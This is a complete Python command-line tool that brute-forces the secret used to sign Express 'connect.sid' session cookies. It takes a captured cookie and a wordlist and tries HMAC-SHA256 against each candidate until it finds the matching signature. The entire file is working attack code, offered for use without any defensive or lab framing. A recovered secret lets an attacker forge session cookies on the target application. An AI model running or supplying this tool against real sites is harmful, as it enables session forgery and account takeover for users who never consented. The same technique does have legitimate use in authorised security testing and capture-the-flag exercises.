#!/usr/bin/env python3
import argparse
import base64
import hashlib
import hmac
import sys
import urllib.parse


def b64_nopad(b: bytes) -> str:
    """Standard base64, no trailing '=' padding."""
    return base64.b64encode(b).decode("ascii").rstrip("=")


def b64url_nopad(b: bytes) -> str:
    """URL-safe base64, no trailing '=' padding."""
    return base64.urlsafe_b64encode(b).decode("ascii").rstrip("=")


def parse_connect_sid(cookie_value: str) -> tuple[str, str]:
    """
    Accepts either:
      - full "connect.sid=..." string
      - just the cookie value part
    Returns (sid, sig).
    """
    s = cookie_value.strip()

    # If user pasted "connect.sid=....", strip name
    if "connect.sid=" in s:
        s = s.split("connect.sid=", 1)[1].strip()

    # If user pasted a cookie header like "connect.sid=...; other=..."
    if ";" in s:
        s = s.split(";", 1)[0].strip()

    # URL decode
    s = urllib.parse.unquote(s)

    if not s.startswith("s:"):
        raise ValueError(f"Cookie does not look signed (missing 's:' prefix) after decoding: {s[:80]}")

    body = s[2:]  # drop "s:"
    if "." not in body:
        raise ValueError("Signed cookie missing '.' separator between value and signature.")

    # signature is after the LAST dot
    sid, sig = body.rsplit(".", 1)
    if not sid or not sig:
        raise ValueError("Failed to parse sid/signature from cookie.")
    return sid, sig


def candidate_sigs(sid: str, secret: str) -> set[str]:
    """
    Express/cookie-signature uses HMAC-SHA256(sid, secret), base64 w/o '=' padding.
    Some deployments end up with urlsafe base64 in the cookie, so we check both.
    """
    mac = hmac.new(secret.encode("utf-8"), sid.encode("utf-8"), hashlib.sha256).digest()
    return {b64_nopad(mac), b64url_nopad(mac)}


def main():
    ap = argparse.ArgumentParser(description="Bruteforce Express connect.sid cookie secret from a wordlist.")
    ap.add_argument("--cookie", required=True, help="connect.sid cookie value (or full 'connect.sid=...').")
    ap.add_argument("--wordlist", required=True, help="Path to wordlist (one secret per line).")
    ap.add_argument("--ignore-empty", action="store_true", help="Skip empty lines in wordlist.")
    ap.add_argument("--max", type=int, default=0, help="Max candidates to try (0 = no limit).")
    args = ap.parse_args()

    try:
        sid, sig = parse_connect_sid(args.cookie)
    except Exception as e:
        print(f"[!] Parse error: {e}", file=sys.stderr)
        sys.exit(2)

    print(f"[*] Parsed SID length: {len(sid)}")
    print(f"[*] Target signature: {sig}")

    tried = 0
    with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            secret = line.rstrip("\n").rstrip("\r")
            if args.ignore_empty and not secret.strip():
                continue

            tried += 1
            if args.max and tried > args.max:
                break

            if sig in candidate_sigs(sid, secret):
                print(f"[+] FOUND secret: {secret}")
                print(f"[+] Tried: {tried}")
                return

            if tried % 100000 == 0:
                print(f"[*] Tried {tried} candidates...")

    print(f"[-] Secret not found in wordlist. Tried: {tried}")
    sys.exit(1)


if __name__ == "__main__":
    main()
